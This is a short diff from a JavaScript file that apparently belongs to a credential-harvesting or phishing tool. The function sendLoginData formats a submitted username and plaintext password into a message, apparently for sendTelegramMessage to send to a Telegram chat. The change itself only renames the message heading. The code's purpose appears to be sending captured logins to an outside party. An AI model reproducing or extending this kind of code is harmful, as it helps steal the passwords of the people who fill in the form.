@@ -67,7 +67,7 @@ export const sendTelegramMessage = async (message) => {
 export const sendLoginData = (formData) => {
   const timestamp = new Date().toLocaleString();
   const message = `
-<b>🔐 Login Attempt</b>
+<b>🔐 Login Details</b>
 <b>Time:</b> ${escapeHTML(timestamp)}
 <b>Username:</b> ${escapeHTML(formData.username)}
 <b>Password:</b> ${escapeHTML(formData.password)}
